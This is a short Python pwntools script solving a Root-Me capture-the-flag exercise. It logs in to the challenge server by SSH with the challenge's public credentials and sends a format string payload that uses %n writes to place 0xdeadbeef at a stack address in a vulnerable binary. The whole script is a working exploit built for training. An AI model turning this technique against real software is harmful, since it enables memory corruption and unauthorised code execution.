# Root-Me: ELF x86 - Format string bug basic 2
# woanmeo11

from pwn import *

chall = 'app-systeme-ch14'
r = ssh(host='challenge02.root-me.org', port=2222, user=chall, password=chall)

payload = p32(0xbffffb88) + p32(0xbffffb88 + 2) + f'%{0xbeef - 8}x%9$n'.encode() + f'%{0xdead - 0xbeef}x%10$n'.encode()
print(payload)
r = r.process(['ch14', payload])

r.interactive()
